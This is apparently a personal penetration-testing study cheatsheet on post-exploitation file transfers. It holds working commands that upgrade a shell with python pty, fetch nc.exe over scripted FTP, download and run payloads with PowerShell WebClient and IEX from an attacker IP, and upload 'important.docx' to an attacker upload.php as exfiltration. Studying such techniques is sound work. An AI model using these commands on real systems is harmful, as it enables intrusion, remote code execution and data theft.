---
id: activeinformationgathering
tags: [bash, cheatsheet]
created: 2023-01-26
---
# active-information-gathering

backlinks: [[snippets-bash]]

sources:
- <https://danielmiessler.com/study/vulnerability-database-resources/>
  
- File Transfers
  - IT IS EXTREMELY IMPORTANT TO DOCUMENT UPLOADS AND REMOVE THEM AFTER THE ASSESSMENT IS COMPLETE
  - IT IS ALWAYS PREFERRABLE TO USE NATIVE TOOLS ALREADY IN THE SYSTEM
  - non interacitve shells can run commands like ls
  - interactive shells require interaction (eg ftp - prompt, response)
  - Upgrading shells to be interactive
    - ```python python3 -c 'import pty; pty.spawn("/bin/bash")'```
    - ```shell stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;```
  - Transfering files with windows
    - ftp from windows to attacker using  

      - ```shell create text file with commands
        echo open 10.11.0.4 21> getfile.txt
        echo USER offsec>> getfile.txt
        echo lab>> getfile.txt
        echo bin >> getfile.txt
        echo GET nc.exe >> getfile.txt
        echo bye >> getfile.txt```

      - execute ```shell ftp -v -n -s:getfile.txt```
  - Windows scripting engines
    - [wget for vbs](../../../tools/wget.md)
    - [wget for powershell](../../../tools/wget.md)
    - powershell 
      - download ```shell powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')```
      - download and execute using IEX ```shell powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')```
      - [exe2hex](../../../tools/exe2hex.md) - convert binary to hex to cmd to powershell back to binary
  - Exfiltration
    - powershell upload to [upload.php](../../../tools/apache2.md) ```shell powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')```
  - UDP based file transfers
    - TFTP is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.